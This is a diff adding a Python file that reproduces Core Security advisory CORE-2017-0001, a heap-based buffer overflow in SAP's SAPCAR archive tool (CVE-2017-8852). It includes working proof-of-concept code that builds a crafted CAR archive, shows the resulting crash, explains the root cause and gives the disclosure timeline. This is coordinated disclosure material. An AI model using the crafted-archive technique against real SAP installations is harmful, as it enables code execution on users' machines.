@@ -1,0 +1,118 @@
+'''
+Source: https://www.coresecurity.com/advisories/sap-sapcar-heap-based-buffer-overflow-vulnerability
+
+1. Advisory Information
+
+Title: SAP SAPCAR Heap Based Buffer Overflow Vulnerability
+Advisory ID: CORE-2017-0001
+Advisory URL: http://www.coresecurity.com/advisories/sap-sapcar-heap-based-buffer-overflow-vulnerability
+Date published: 2017-05-10
+Date of last update: 2017-05-10
+Vendors contacted: SAP
+Release mode: Coordinated release
+
+2. Vulnerability Information
+
+Class: Heap-based Buffer Overflow [CWE-122]
+Impact: Code execution
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2017-8852
+
+
+3. Vulnerability Description
+
+SAP [1] distributes software and packages using an archive program called SAPCAR [2]. This program uses a custom archive file format. A memory corruption vulnerability was found in the parsing of specially crafted archive files, that could lead to local code execution scenarios.
+
+4. Vulnerable Packages
+
+SAPCAR archive tool version 721.510
+Other products and versions might be affected, but they were not tested.
+
+5. Vendor Information, Solutions and Workarounds
+
+SAP published the following Security Notes:
+
+2441560
+6. Credits
+
+This vulnerability was discovered and researched by Martin Gallo and Maximiliano Vidal from Core Security Consulting Services. The publication of this advisory was coordinated by Alberto Solino from Core Advisories Team.
+
+
+7. Technical Description / Proof of Concept Code
+
+This vulnerability is caused by a controlled heap buffer overflow when opening a specially crafted CAR archive file.
+
+The following python code can be used to generate an archive file that triggers the vulnerability:
+'''
+
+#!/usr/bin/env python
+ 
+from scapy.packet import Raw
+from pysap.SAPCAR import *
+ 
+# We write a file just to have some data to put into the archive
+with open("string.txt", "w") as fd:
+    fd.write("Some string to compress")
+ 
+# Create a new SAP CAR Archive
+f = SAPCARArchive("poc.car", mode="wb", version=SAPCAR_VERSION_200)
+# Add the text file
+f.add_file("string.txt")
+ 
+# Replace the blocks in the compressed file with the faulty blocks
+f._sapcar.files0[0].blocks.append(Raw("D>" + "\x00"*30 + "\x00\xff"))
+f._sapcar.files0[0].blocks.append(Raw("A" * 0xffff))
+ 
+# Write the file
+f.write()
+
+'''
+$ ./SAPCAR -tvf poc.car
+SAPCAR: processing archive poc.car (version 2.00)
+-rw-rw-r--          23    09 Feb 2017 18:12 string.txt
+Segmentation fault (core dumped)
+The CAR archive files in its version 2.00 are comprised of an archive header and a list of archived files [3]. Each archived file has a header containing the file's metadata, and the content of the file is split among several blocks. When the SAPCAR program opens a file containing an archived file block different than the known ones [4], it reads an additional 32 bytes of file metadata. The program then uses the last two bytes of the data read as a size field, and copies that amount of data into a fixed-length buffer previously allocated in the heap. As the length field is not properly validated, the operation results in a heap-based buffer overflow.
+
+It's worth mentioning that signature validation doesn't prevent the vulnerability to be triggered, as the signature file needs to be extracted from the archive file in order for the validation to be performed.
+
+
+8. Report Timeline
+
+2017-02-15: Core Security sent an initial notification to SAP.
+2017-02-16: SAP confirmed the reception of the email and requested the draft version of the advisory.
+2017-02-16: Core Security sent SAP a draft version of the advisory and informed them we would adjust our publication schedule according with the release of a solution to the issues.
+2017-02-17: SAP confirmed reception of the draft advisory and assigned the incident ticket 1780137949 for tracking this issue. They will answer back once the team analyze the report.
+2017-03-06: Core Security asked SAP for news about the advisory and publication date.
+2017-03-08: SAP answered back saying they had troubles generating the SAPCAR archive. They asked for a pre-built one.
+2017-03-08: Core Security researcher sent a PoC SAPCAR archive that can trigger the vulnerability. SAP confirmed reception.
+2017-03-08: SAP asked for GPG key for one of the researchers involved in the discovery. Core Security sent (again) the key. SAP confirmed reception.
+2017-03-13: SAP confirmed they could reproduce the vulnerability. They said they cannot commit to a publication date yet, but they aim at May 9th, although it could fall in April Patch day or postpone after May.
+2017-03-13: Core Security thanked SAP for the tentative date and informed them we would publish our security advisory accordingly upon their confirmation.
+2017-04-03: Core Security asked SAP for an update about the final publication date for this vulnerability's patch.
+2017-04-05: SAP confirmed they will be able to release the fix in May, although there could be chances to release it in April. They will confirm as soon as possible.
+2017-04-05: Core Security thanked SAP for the update and asked for a security note number and CVE (if available) to include in the final advisory.
+2017-04-10: SAP informed the security note for this vulnerability and confirmed they will be releasing the fix in May 9th. Core Security confirmed reception.
+2017-05-08: SAP informed the release of the security note and the credits included in it. Core Security confirmed reception.
+2017-05-10: Advisory CORE-2017-0001 published.
+9. References
+
+[1] http://go.sap.com/.
+[2] https://launchpad.support.sap.com/#/softwarecenter/template/products/_APP=00200682500000001943%26_EVENT=DISPHIER%26HEADER=N%26FUNCTIONBAR=Y%26EVENT=TREE%26TMPL=INTRO_SWDC_SP_AD%26V=MAINT%26REFERER=CATALOG-PATCHES%26ROUTENAME=products/By%20Category%20-%20Additional%20Components.
+[3] https://www.coresecurity.com/corelabs-research/publications/deep-dive-sap-archive-file-formats.
+[4] https://github.com/CoreSecurity/pysap/blob/master/pysap/SAPCAR.py#L107.
+
+10. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://www.coresecurity.com/core-labs.
+
+11. About Core Security
+
+Courion and Core Security have rebranded the combined company, changing its name to Core Security, to reflect the company's strong commitment to providing enterprises with market-leading, threat-aware, identity, access and vulnerability management solutions that enable actionable intelligence and context needed to manage security risks across the enterprise. Core Security's analytics-driven approach to security enables customers to manage access and identify vulnerabilities, in order to minimize risks and maintain continuous compliance. Solutions include Multi-Factor Authentication, Provisioning, Identity Governance and Administration (IGA), Identity and Access Intelligence (IAI), and Vulnerability Management (VM). The combination of these solutions provides context and shared intelligence through analytics, giving customers a more comprehensive view of their security posture so they can make more informed, prioritized, and better security remediation decisions.
+
+Core Security is headquartered in the USA with offices and operations in South America, Europe, Middle East and Asia. To learn more, contact Core Security at (678) 304-4500 or info@coresecurity.com.
+
+12. Disclaimer
+
+The contents of this advisory are copyright (c) 2017 Core Security and (c) 2017 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+'''
